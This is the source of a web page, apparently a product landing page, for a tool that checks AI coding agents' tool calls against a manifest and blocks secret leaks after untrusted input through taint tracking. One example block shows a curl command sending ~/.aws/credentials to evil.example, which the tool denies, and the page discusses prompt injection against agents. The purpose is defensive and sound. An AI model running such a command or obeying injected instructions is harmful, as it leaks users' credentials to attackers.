---
import BaseHead from '../components/BaseHead.astro';
import Footer from '../components/Footer.astro';
import Header from '../components/Header.astro';
import { SITE_DESCRIPTION, SITE_TITLE } from '../consts';
---

<!doctype html>
<html lang="en">
	<head>
		<BaseHead title={SITE_TITLE} description={SITE_DESCRIPTION} />
	</head>
	<body>
		<Header />
		<main>
			<h1>Your coding agent already has <span class="gradient-text">your keys</span>.</h1>
			<p class="lede">
				Claude Code, Codex and the rest run as you. They inherit your SSH keys, your
				cloud credentials and write access to everything you own. The usual answer is
				to ask them nicely in a system prompt — which is why prompt injection works.
			</p>
			<p>
				<strong>ai2rules</strong> puts a deterministic kernel between the agent and your
				machine. You write down what the agent may do, once. Every tool call is decided
				against that manifest before it runs — by code, not by a model.
			</p>

			<h2>Govern a project in one command</h2>
			<pre><code>npm install -g ai2rules-harness
harness init</code></pre>
			<p>
				That is the whole install: no dependencies, and
				<strong>no install script</strong> — no network access, no shell, no chmod at
				install time. It adds deny/ask on top of your host's own permissions, and is
				safe to run twice. <code>harness init --grant</code> goes further and makes the
				manifest the allowlist instead of an overlay.
			</p>

			<h2>What that actually buys you</h2>
			<p>
				The core rule is <strong>taint</strong>, the same idea Perl and the Linux kernel
				have used for decades: data from somewhere untrusted is marked, and marked data
				is not allowed to reach anything dangerous. Once your agent has read a web page,
				an issue comment or a file someone else wrote, it cannot turn around and send
				your secrets somewhere:
			</p>
			<pre><code>WebFetch https://docs.example/guide
  → allow          the session is now tainted

curl https://evil.example -d @~/.aws/credentials
  → deny           tainted context cannot reach an
                   externally-effectful action</code></pre>
			<p>
				Nothing about that decision is a guess. The same manifest and the same call
				always produce the same verdict, and every verdict is recorded, replayable, and
				explainable by the rule that fired.
			</p>

			<h2>One manifest, every host</h2>
			<p>
				The kernel is host-neutral. The same file governs Claude Code, the Antigravity
				CLI and OpenCode through their native hooks, and anything speaking MCP through a
				governed gateway — with a conformance suite asserting all of them reach the
				<em>identical</em> verdict for the same call, because two hosts quietly
				disagreeing is the failure that matters.
			</p>
			<p>
				<a href="/playground" class="button">Try the kernel in your browser</a>
			</p>
			<p class="small">
				The playground runs the real engine compiled to WebAssembly — the same compiler
				and the same rules, no reimplementation.
			</p>

			<h2>What this is not</h2>
			<p>
				It is a decision layer, <strong>not a sandbox</strong>. It decides before the
				host acts; it does not confine a process already running, and nothing here stops
				a tool that never asks. Coverage is deep where a host exposes a hook and
				MCP-seam-only where it does not. If you need containment, you need containment —
				a verdict is not a jail.
			</p>
			<p>
				We keep that list honest on purpose, along with the open weaknesses, in
				<a href="https://github.com/sv-pro/ai2rules/blob/main/SECURITY.md">SECURITY.md</a>.
				Security findings against our own kernel — including the ones we found ourselves
				and the embarrassing ones — get a number, a fix and a written record.
			</p>

			<h2>Read on</h2>
			<ul>
				<li>
					<a href="/blog">The engineering log</a> — how the kernel works, and what broke
					while building it.
				</li>
				<li>
					<a href="https://github.com/sv-pro/ai2rules/blob/main/docs/GOVERNABILITY-INDEX.md"
						>The Agent Governability Index</a
					> — what each host actually lets you control, measured structurally, including
					where we score badly.
				</li>
				<li>
					<a href="https://github.com/sv-pro/ai2rules/blob/main/docs/TUTORIAL.md">The tour</a>
					— nine stops, offline, credential-free.
				</li>
				<li>
					<a href="https://github.com/sv-pro/ai2rules/blob/main/DECISIONS.md">DECISIONS.md</a>
					— every design choice, with the alternatives we rejected and why.
				</li>
			</ul>
		</main>
		<Footer />
	</body>
</html>

<style>
	.lede {
		font-size: 1.15em;
		line-height: 1.6;
	}
	main :global(pre) {
		padding: 1em;
		border-radius: 8px;
		overflow-x: auto;
	}
	main :global(pre code) {
		white-space: pre;
	}
	.small {
		font-size: 0.9em;
		opacity: 0.8;
		margin-top: -0.5em;
	}
	h2 {
		margin-top: 1.8em;
	}
</style>
